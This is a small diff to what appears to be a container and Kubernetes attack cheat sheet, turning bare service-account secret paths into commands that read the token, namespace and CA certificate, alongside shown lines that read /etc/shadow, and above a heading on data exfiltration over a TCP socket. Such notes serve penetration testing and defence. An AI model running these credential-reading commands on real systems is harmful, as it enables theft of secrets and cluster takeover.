@@ -31,9 +31,10 @@ capsh —print #printCapabilities
 ifconfig | grep inet
 cat /etc/shadow
 
-/var/run/secrets/kubernetes.io/serviceaccount/token
-/var/run/secrets/kubernetes.io/serviceaccount/namespace
-/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+ls /var/run/secrets/kubernetes.io/serviceaccount
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+ca /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 ```
 
 ### Data Exfiltration via TCP Socket 👀
